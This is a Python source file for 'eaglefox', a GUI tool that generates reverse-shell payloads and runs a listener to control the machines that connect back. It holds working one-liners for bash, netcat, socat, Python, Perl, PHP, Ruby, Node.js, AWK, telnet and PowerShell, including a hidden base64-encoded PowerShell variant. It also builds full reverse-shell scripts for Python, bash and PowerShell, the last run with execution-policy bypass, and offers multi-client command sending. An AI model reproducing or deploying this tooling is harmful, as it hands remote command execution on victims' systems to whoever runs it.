#!/usr/bin/env python3
#========================
# Note
# Claude Was Used In
# The Making Of This
#
# AI WAS USED
# =--BeysonSec--=
#======================
import base64
import os
import queue
import socket
import threading
import tkinter as tk
from tkinter import filedialog, messagebox, ttk, font
from datetime import datetime

BG      = "#161616"
BAR     = "#1c1c1c"
SCREEN  = "#111111"
FIELD   = "#222222"
FG      = "#c8c8c8"
DIM     = "#6a6a6a"
LINE    = "#2c2c2c"
GREEN   = "#8fbf7f"
RED     = "#c47a72"
BLUE    = "#7a9cc4"

SHELL_TYPES = {
    "Bash TCP":        "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "Bash UDP":        "bash -i >& /dev/udp/{ip}/{port} 0>&1",
    "nc -e":           "nc -e /bin/sh {ip} {port}",
    "nc mkfifo":       "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} > /tmp/f",
    "ncat TLS":        "ncat --ssl {ip} {port} -e /bin/sh",
    "socat":           'socat tcp-connect:{ip}:{port} exec:"/bin/sh -i",pty,stderr,setsid,sigint,sane',
    "Python 3 Linux":  "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",
    "Python Windows":  (
        "python -c \"import socket,subprocess,threading;"
        "s=socket.socket();s.connect(('{ip}',{port}));"
        "p=subprocess.Popen('cmd.exe',stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE);"
        "threading.Thread(target=lambda:[p.stdin.write(d) or p.stdin.flush() for d in iter(lambda:s.recv(4096),b'')],daemon=True).start();"
        "threading.Thread(target=lambda:[s.send(d) for d in iter(lambda:p.stdout.read(1),b'')],daemon=True).start();"
        "threading.Thread(target=lambda:[s.send(d) for d in iter(lambda:p.stderr.read(1),b'')],daemon=True).start();"
        "p.wait()\""
    ),
    "Perl":            (
        "perl -e 'use Socket;$i=\"{ip}\";$p={port};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "connect(S,sockaddr_in($p,inet_aton($i)));"
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        "exec(\"/bin/sh -i\");'"
    ),
    "PHP":             "php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "Ruby":            (
        "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
        "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    ),
    "Node.js":         (
        "node -e 'const n=require(\"net\"),cp=require(\"child_process\");"
        "const s=n.connect({port},\"{ip}\");const sh=cp.spawn(\"/bin/sh\",[]);"
        "s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s);'"
    ),
    "PowerShell TCP":  (
        "powershell -nop -c \"$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        "$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};"
        "while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
        "$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        "$sendback=(iex $data 2>&1|Out-String);"
        "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
        "$client.Close()\""
    ),
    "PowerShell B64":  "__B64__",
    "AWK":             (
        "awk 'BEGIN{{s=\"/inet/tcp/0/{ip}/{port}\";while(1){{"
        "do{{printf \"$s>\" |& s;s |& getline c;"
        "if(c){{while((c |& getline)>0)print $0 |& s;close(c)}}}}"
        "while(c!=\"exit\")close(s)}}}}' /dev/null"
    ),
    "Telnet":          "TF=$(mktemp -u);mkfifo $TF;telnet {ip} {port}<$TF 2>&1|/bin/sh -i>$TF 2>&1;rm -f $TF",
}

STAGED_TEMPLATES = {
    "Python Reverse Shell": {
        "ext":  ".py",
        "note": "Run with: python3 <file>",
        "code": '''\
import socket
import subprocess

LHOST = "{ip}"
LPORT = {port}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((LHOST, LPORT))

while True:
    cmd = s.recv(4096).decode(errors="replace").strip()
    if not cmd:
        continue
    if cmd.lower() in ("exit", "quit"):
        break
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
        out = r.stdout + r.stderr
        s.sendall(out if out else b"[no output]\\n")
    except subprocess.TimeoutExpired:
        s.sendall(b"[timeout]\\n")
    except Exception as exc:
        s.sendall(f"[error] {{exc}}\\n".encode())

s.close()
''',
    },
    "Bash Reverse Shell": {
        "ext":  ".sh",
        "note": "Run with: bash <file>",
        "code": '''\
#!/usr/bin/env bash

LHOST="{ip}"
LPORT={port}

exec 3<>/dev/tcp/$LHOST/$LPORT

while IFS= read -r cmd <&3; do
    [ -z "$cmd" ] && continue
    eval "$cmd" >&3 2>&3
done

exec 3>&-
''',
    },
    "PowerShell Reverse Shell": {
        "ext":  ".ps1",
        "note": "Run with: powershell -ExecutionPolicy Bypass -File <file>",
        "code": '''\
$LHOST = "{ip}"
$LPORT = {port}

$client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
$stream = $client.GetStream()
[byte[]]$buf = 0..65535 | ForEach-Object {{ 0 }}

while (($i = $stream.Read($buf, 0, $buf.Length)) -ne 0) {{
    $cmd    = ([System.Text.ASCIIEncoding]::ASCII).GetString($buf, 0, $i).Trim()
    $result = (Invoke-Expression $cmd 2>&1 | Out-String)
    $reply  = ([System.Text.Encoding]::ASCII).GetBytes($result)
    $stream.Write($reply, 0, $reply.Length)
    $stream.Flush()
}}

$client.Close()
''',
    },
}


def powershell_b64(ip: str, port: str) -> str:
    inner = (
        f'$c=New-Object Net.Sockets.TCPClient("{ip}",{port});'
        f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
        f'while(($i=$s.Read($b,0,$b.Length)) -ne 0){{'
        f'$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'
        f'$r=(iex $d 2>&1|Out-String);'
        f'$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}}'
    )
    b64 = base64.b64encode(inner.encode("utf-16-le")).decode()
    return f"powershell -nop -w hidden -e {b64}"


def build_oneliner(key: str, ip: str, port: str) -> str:
    if key == "PowerShell B64":
        return powershell_b64(ip, port)
    return SHELL_TYPES.get(key, "").format(ip=ip, port=port)


class Eaglefox(tk.Tk):

    def __init__(self):
        super().__init__()
        self.title("eaglefox // beysonsec")
        self.geometry("1080x660")
        self.minsize(880, 540)
        self.configure(bg=BG)

        self.mono   = font.Font(family="Courier", size=10)
        self.mono_b = font.Font(family="Courier", size=10, weight="bold")
        self.ui     = font.Font(family="TkDefaultFont", size=9)

        self.clients = {}
        self.next_id = 1
        self.srv = None
        self.running = False
        self.log_file = None
        self.log_lock = threading.Lock()
        self.q = queue.Queue()

        self._build_style()
        self._build_toolbar()
        self._build_tabs()
        self._build_statusbar()

        self._term_write("eaglefox ready.\n", "info")
        self._term_write("start listener, select client(s), send commands.\n\n", "sys")
        self.after(100, self._poll)

    def _build_style(self):
        s = ttk.Style(self)
        s.theme_use("clam")
        s.configure("TCombobox", fieldbackground=FIELD, background=FIELD,
                    foreground=FG, arrowcolor=DIM, borderwidth=0,
                    bordercolor=LINE, lightcolor=LINE, darkcolor=LINE)
        s.map("TCombobox", fieldbackground=[("readonly", FIELD)],
              foreground=[("readonly", FG)])
        s.configure("TNotebook", background=BG, borderwidth=0, tabmargins=[0, 0, 0, 0])
        s.configure("TNotebook.Tab", background=BG, foreground=DIM,
                    padding=[16, 6], font=self.ui, borderwidth=0)
        s.map("TNotebook.Tab",
              background=[("selected", BG)],
              foreground=[("selected", FG)])
        s.configure("Vertical.TScrollbar", background=FIELD, troughcolor=SCREEN,
                    bordercolor=SCREEN, arrowcolor=DIM, relief="flat")
        s.configure("Horizontal.TScrollbar", background=FIELD, troughcolor=SCREEN,
                    bordercolor=SCREEN, arrowcolor=DIM, relief="flat")

    def entry(self, parent, default="", width=12):
        e = tk.Entry(parent, bg=FIELD, fg=FG, insertbackground=FG,
                     relief="flat", font=self.mono, width=width, bd=0,
                     highlightthickness=1, highlightbackground=LINE,
                     highlightcolor="#555555")
        e.insert(0, default)
        return e

    def label(self, parent, text, fg=DIM):
        return tk.Label(parent, text=text, bg=parent["bg"], fg=fg, font=self.ui)

    def btn(self, parent, text, cmd):
        return tk.Button(parent, text=text, command=cmd,
                         bg=parent["bg"], fg=FG, activebackground=FIELD,
                         activeforeground=FG, relief="flat", bd=0,
                         font=self.mono_b, cursor="hand2", padx=10, pady=2,
                         highlightthickness=0)

    def combo(self, parent, var, values, width=18):
        return ttk.Combobox(parent, textvariable=var, values=values,
                            font=self.mono, width=width, state="readonly")

    def hline(self, parent):
        f = tk.Frame(parent, bg=LINE, height=1)
        f.pack(fill="x")
        return f

    def _build_toolbar(self):
        bar = tk.Frame(self, bg=BAR)
        bar.pack(fill="x")
        self.hline(self)  # hairline under everything later via tabs

        self.label(bar, " lhost ").pack(side="left")
        self.ip_e = self.entry(bar, "127.0.0.1", 13)
        self.ip_e.pack(side="left", padx=(0, 10), pady=7, ipady=2)

        self.label(bar, " lport ").pack(side="left")
        self.port_e = self.entry(bar, "4444", 5)
        self.port_e.pack(side="left", padx=(0, 14), pady=7, ipady=2)

        # payload one-liner
        self.ol_var = tk.StringVar(value="Bash TCP")
        self.ol_combo = self.combo(bar, self.ol_var, list(SHELL_TYPES.keys()))
        self.ol_combo.pack(side="left", padx=(0, 2), pady=7, ipady=2)
        self.btn(bar, "gen", self.do_generate).pack(side="left")
        self.btn(bar, "all", self.do_generate_all).pack(side="left")
        self.btn(bar, "copy", self.do_copy).pack(side="left", padx=(0, 14))

        # staged
        self.st_var = tk.StringVar(value=list(STAGED_TEMPLATES.keys())[0])
        self.st_combo = self.combo(bar, self.st_var, list(STAGED_TEMPLATES.keys()), 16)
        self.st_combo.pack(side="left", padx=(0, 2), pady=7, ipady=2)
        self.btn(bar, "preview", self.do_preview).pack(side="left")
        self.btn(bar, "build", self.do_build).pack(side="left", padx=(0, 14))

        # log toggle — right side
        self.log_active = tk.BooleanVar(value=False)
        self.log_chk = tk.Checkbutton(bar, text="log off", variable=self.log_active,
                                      command=self._toggle_log, bg=BAR, fg=DIM,
                                      selectcolor=BAR, activebackground=BAR,
                                      activeforeground=GREEN, indicatoron=False,
                                      relief="flat", font=self.mono_b, cursor="hand2",
                                      padx=6, pady=2, bd=0, highlightthickness=0)
        self.log_chk.pack(side="right", padx=(6, 12))
        self.log_e = self.entry(bar, "", 16)
        self.log_e.pack(side="right", pady=7, ipady=2)
        self.btn(bar, "…", self._browse_log).pack(side="right")
        self.label(bar, " log ").pack(side="right")

    def _build_tabs(self):
        self.hline(self)
        self.nb = ttk.Notebook(self)
        self.nb.pack(fill="both", expand=True)
        self._build_session_tab()
        self._build_builder_tab()

    def _build_session_tab(self):
        tab = tk.Frame(self.nb, bg=BG)
        self.nb.add(tab, text=" session ")

        bar = tk.Frame(tab, bg=BG)
        bar.pack(fill="x", padx=10, pady=(8, 4))
        self.start_btn = self.btn(bar, "[ start ]", self.start_listener)
        self.start_btn.pack(side="left")
        self.stop_btn = self.btn(bar, "[ stop ]", self.stop_listener)
        self.stop_btn.pack(side="left", padx=(0, 16))
        self.status = tk.Label(bar, text="offline", font=self.mono_b,
                               fg=RED, bg=BG)
        self.status.pack(side="left")

        right = tk.Frame(tab, bg=BG, width=190)
        right.pack(side="right", fill="y")
        right.pack_propagate(False)
        self.label(right, "clients", fg=DIM).pack(anchor="w", padx=10, pady=(4, 2))
        self.client_listbox = tk.Listbox(
            right, bg=SCREEN, fg=FG, bd=0, relief="flat",
            highlightthickness=1, highlightbackground=LINE,
            font=self.mono, activestyle="none",
            selectmode=tk.EXTENDED, selectbackground="#3a3a3a",
            selectforeground=FG)
        self.client_listbox.pack(fill="both", expand=True, padx=10, pady=(0, 6))
        self.client_listbox.bind("<<ListboxSelect>>", self._on_client_select)

        left = tk.Frame(tab, bg=BG)
        left.pack(side="left", fill="both", expand=True)

        inp = tk.Frame(left, bg=BG)
        inp.pack(side="bottom", fill="x", padx=10, pady=(0, 8))
        self.prompt = tk.Label(inp, text="$", font=self.mono_b, fg=DIM, bg=BG)
        self.prompt.pack(side="left")
        self.cmd_e = self.entry(inp, "", 0)
        self.cmd_e.pack(side="left", fill="both", expand=True, padx=(6, 6), ipady=3)
        self.btn(inp, "send", self.send_command).pack(side="right")
        self.cmd_e.bind("<Return>", self.send_command)

        scroll = ttk.Scrollbar(left)
        self.term = tk.Text(left, bg=SCREEN, fg=FG, bd=0, relief="flat",
                            highlightthickness=1, highlightbackground=LINE,
                            font=self.mono, state="disabled", wrap="word",
                            insertbackground=FG, padx=8, pady=6,
                            yscrollcommand=scroll.set)
        scroll.config(command=self.term.yview)
        scroll.pack(side="right", fill="y", padx=(10, 10), pady=(0, 2))
        self.term.pack(fill="both", expand=True, padx=(10, 0), pady=(0, 2))

        self.term.tag_configure("sys",  foreground=DIM,   font=self.mono)
        self.term.tag_configure("recv", foreground=GREEN, font=self.mono)
        self.term.tag_configure("cmd",  foreground=BLUE,  font=self.mono_b)
        self.term.tag_configure("err",  foreground=RED,   font=self.mono_b)
        self.term.tag_configure("info", foreground=FG,    font=self.mono)

    def _build_builder_tab(self):
        tab = tk.Frame(self.nb, bg=BG)
        self.nb.add(tab, text=" builder ")

        scroll_y = ttk.Scrollbar(tab)
        scroll_x = ttk.Scrollbar(tab, orient="horizontal")
        self.b_screen = tk.Text(tab, bg=SCREEN, fg=FG, bd=0, relief="flat",
                                highlightthickness=1, highlightbackground=LINE,
                                font=self.mono, state="disabled", wrap="none",
                                padx=8, pady=6,
                                yscrollcommand=scroll_y.set,
                                xscrollcommand=scroll_x.set)
        scroll_y.config(command=self.b_screen.yview)
        scroll_x.config(command=self.b_screen.xview)
        scroll_y.pack(side="right", fill="y", padx=(0, 10), pady=(8, 10))
        scroll_x.pack(side="bottom", fill="x", padx=10)
        self.b_screen.pack(fill="both", expand=True, padx=(10, 0), pady=(8, 0))

        self.b_screen.tag_configure("hdr",  foreground=BLUE,  font=self.mono_b)
        self.b_screen.tag_configure("body", foreground=GREEN, font=self.mono)
        self.b_screen.tag_configure("meta", foreground=DIM,   font=self.mono)
        self.b_screen.tag_configure("err",  foreground=RED,   font=self.mono_b)
        self.b_screen.tag_configure("ok",   foreground=GREEN, font=self.mono_b)

    def _build_statusbar(self):
        bar = tk.Frame(self, bg=BAR, height=22)
        bar.pack(fill="x", side="bottom")
        bar.pack_propagate(False)
        self.statusbar = tk.Label(bar, text="", font=self.ui, fg=DIM, bg=BAR,
                                  anchor="w")
        self.statusbar.pack(fill="x", padx=10)
        self._set_status("idle")

    def _set_status(self, text):
        self.statusbar.config(text=text)

    def _term_write(self, text, tag="info"):
        self.term.config(state="normal")
        self.term.insert(tk.END, text, tag)
        self.term.see(tk.END)
        self.term.config(state="disabled")
        self._log_write(text)

    def _b_write(self, text, tag="body"):
        self.b_screen.config(state="normal")
        self.b_screen.insert(tk.END, text, tag)
        self.b_screen.see(tk.END)
        self.b_screen.config(state="disabled")

    def _b_clear(self):
        self.b_screen.config(state="normal")
        self.b_screen.delete("1.0", tk.END)
        self.b_screen.config(state="disabled")

    def _params(self):
        ip = self.ip_e.get().strip() or "127.0.0.1"
        raw = self.port_e.get().strip() or "4444"
        try:
            p = int(raw)
            if not 1 <= p <= 65535:
                raise ValueError
        except ValueError:
            self._b_clear()
            self._b_write("[!] invalid port — 1-65535\n", "err")
            return None
        return ip, str(p)

    def do_generate(self):
        p = self._params()
        if not p:
            return
        ip, port = p
        key = self.ol_var.get()
        self._b_clear()
        self._b_write(f"{key}\n{'─' * 66}\n", "hdr")
        self._b_write(f"{build_oneliner(key, ip, port)}\n\n", "body")
        self._b_write(f"lhost={ip}  lport={port}\n", "meta")

    def do_generate_all(self):
        p = self._params()
        if not p:
            return
        ip, port = p
        self._b_clear()
        self._b_write(f"all shells   lhost={ip}  lport={port}\n\n", "meta")
        for key in SHELL_TYPES:
            self._b_write(f"{key}\n{'─' * 66}\n", "hdr")
            self._b_write(f"{build_oneliner(key, ip, port)}\n\n", "body")

    def do_copy(self):
        text = self.b_screen.get("1.0", tk.END).strip()
        if text:
            self.clipboard_clear()
            self.clipboard_append(text)
            self._set_status("copied")
            self.after(1500, lambda: self._set_status("idle"))

    def do_preview(self):
        p = self._params()
        if not p:
            return
        ip, port = p
        name = self.st_var.get()
        tpl = STAGED_TEMPLATES[name]
        self._b_clear()
        self._b_write(f"preview — {name}\n{'─' * 66}\n", "hdr")
        self._b_write(f"{tpl['note']}\n\n", "meta")
        self._b_write(tpl["code"].format(ip=ip, port=int(port)), "body")

    def do_build(self):
        p = self._params()
        if not p:
            return
        ip, port = p
        name = self.st_var.get()
        save_dir = filedialog.askdirectory(title="Save staged payload to…")
        if not save_dir:
            return
        tpl = STAGED_TEMPLATES[name]
        fname = name.lower().replace(" ", "_") + tpl["ext"]
        fpath = os.path.join(save_dir, fname)
        try:
            with open(fpath, "w", encoding="utf-8") as f:
                f.write(tpl["code"].format(ip=ip, port=int(port)))
            kb = os.path.getsize(fpath) / 1024
            self._b_write(f"\n[ok] {fpath} ({kb:.1f} KB)\n{tpl['note']}\n", "ok")
        except OSError as exc:
            self._b_write(f"\n[err] {exc}\n", "err")

    def _browse_log(self):
        pth = filedialog.asksaveasfilename(defaultextension=".txt",
                                           filetypes=[("Text", "*.txt"), ("All", "*.*")],
                                           title="Session log file")
        if pth:
            self.log_e.delete(0, tk.END)
            self.log_e.insert(0, pth)

    def _toggle_log(self):
        if self.log_active.get():
            path = self.log_e.get().strip()
            if not path:
                messagebox.showerror("Log", "Set a log file path first.")
                self.log_active.set(False)
                self.log_chk.config(text="log off", fg=DIM)
                return
            try:
                with self.log_lock:
                    self.log_file = open(path, "a", encoding="utf-8")
                    self.log_file.write(
                        f"\n{'=' * 60}\nSESSION START  {datetime.now().isoformat()}\n{'=' * 60}\n")
                    self.log_file.flush()
                self.log_chk.config(text="log on", fg=GREEN)
            except OSError as exc:
                messagebox.showerror("Log", str(exc))
                self.log_active.set(False)
                self.log_chk.config(text="log off", fg=DIM)
        else:
            with self.log_lock:
                if self.log_file and not self.log_file.closed:
                    self.log_file.write(f"\nSESSION END  {datetime.now().isoformat()}\n")
                    self.log_file.flush()
                    self.log_file.close()
                self.log_file = None
            self.log_chk.config(text="log off", fg=DIM)

    def _log_write(self, text):
        with self.log_lock:
            if self.log_file and not self.log_file.closed:
                self.log_file.write(text)
                self.log_file.flush()

    def start_listener(self):
        if self.running:
            self._term_write("[!] already running\n", "err")
            return
        raw = self.port_e.get().strip()
        try:
            port = int(raw)
            if not 1 <= port <= 65535:
                raise ValueError
        except ValueError:
            self._term_write("[!] invalid port\n", "err")
            return
        self.running = True
        self.status.config(text=f"listening :{port}", fg=GREEN)
        self._set_status(f"listening on 0.0.0.0:{port}")
        threading.Thread(target=self._accept_loop, args=(port,), daemon=True).start()

    def stop_listener(self):
        self.running = False
        if self.srv:
            try:
                self.srv.close()
            except OSError:
                pass
        self.srv = None
        for cid in list(self.clients):
            try:
                self.clients[cid]["sock"].close()
            except (OSError, KeyError):
                pass
        self.clients.clear()
        self.client_listbox.delete(0, tk.END)
        self.status.config(text="offline", fg=RED)
        self._set_status("listener stopped")
        self._term_write("[*] listener stopped\n", "sys")

    def _accept_loop(self, port):
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", port))
            srv.listen(10)
            srv.settimeout(1.0)
            self.srv = srv
            self.q.put(("sys", f"[*] listening on 0.0.0.0:{port}"))
        except OSError as exc:
            self.running = False
            self.q.put(("err", f"[!] bind failed: {exc}"))
            self.q.put(("offline", None))
            return

        while self.running:
            try:
                conn, addr = srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            cid = self.next_id
            self.next_id += 1
            self.clients[cid] = {"sock": conn, "addr": addr}
            self.q.put(("conn_add", (cid, addr)))
            threading.Thread(target=self._recv_loop, args=(cid, conn), daemon=True).start()

        self.running = False
        self.q.put(("offline", None))

    def _recv_loop(self, cid, conn):
        conn.settimeout(0.5)
        while self.running:
            try:
                data = conn.recv(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            if not data:
                break
            self.q.put(("recv", data.decode(errors="replace")))
        try:
            conn.close()
        except OSError:
            pass
        self.q.put(("conn_close", cid))

    def _selected_cids(self):
        sel = self.client_listbox.curselection()
        keys = list(self.clients.keys())
        return [keys[i] for i in sel if i < len(keys)]

    def send_command(self, event=None):
        cmd = self.cmd_e.get().strip()
        if not cmd:
            return
        targets = self._selected_cids()
        if not targets:
            self._term_write("[!] no client selected\n", "err")
            return
        delivered = 0
        for cid in targets:
            sock = self.clients.get(cid, {}).get("sock")
            if sock is None:
                continue
            try:
                sock.sendall((cmd + "\n").encode())
                delivered += 1
            except OSError as exc:
                self._term_write(f"[!] send error cid={cid}: {exc}\n", "err")
        label = f"[{delivered}/{len(targets)}]" if len(targets) > 1 else ""
        self._term_write(f"cmd{label}> {cmd}\n", "cmd")
        self.cmd_e.delete(0, tk.END)

    def _on_client_select(self, event=None):
        sel = self.client_listbox.curselection()
        if not sel:
            return
        keys = list(self.clients.keys())
        if len(sel) == 1:
            addr = self.clients[keys[sel[0]]]["addr"]
            self._term_write(f"--- selected: {addr[0]}:{addr[1]} ---\n", "sys")
        else:
            self._term_write(f"--- {len(sel)} clients selected ---\n", "sys")

    def _poll(self):
        try:
            while True:
                kind, payload = self.q.get_nowait()
                if kind == "sys":
                    stamp = datetime.now().strftime("%H:%M:%S")
                    self._term_write(f"[{stamp}] {payload}\n", "sys")
                elif kind == "err":
                    self._term_write(payload + "\n", "err")
                elif kind == "offline":
                    self.status.config(text="offline", fg=RED)
                elif kind == "conn_add":
                    cid, addr = payload
                    self.client_listbox.insert(tk.END, f"{addr[0]}:{addr[1]}")
                    self._term_write(f"[+] shell  {addr[0]}:{addr[1]}  cid={cid}\n", "sys")
                elif kind == "recv":
                    self._term_write(payload, "recv")
                elif kind == "conn_close":
                    cid = payload
                    if cid in self.clients:
                        addr = self.clients[cid]["addr"]
                        keys = list(self.clients.keys())
                        self.client_listbox.delete(keys.index(cid))
                        del self.clients[cid]
                        self._term_write(f"[-] closed  {addr[0]}:{addr[1]}  cid={cid}\n", "sys")
        except queue.Empty:
            pass
        self.after(100, self._poll)


if __name__ == "__main__":
    Eaglefox().mainloop()
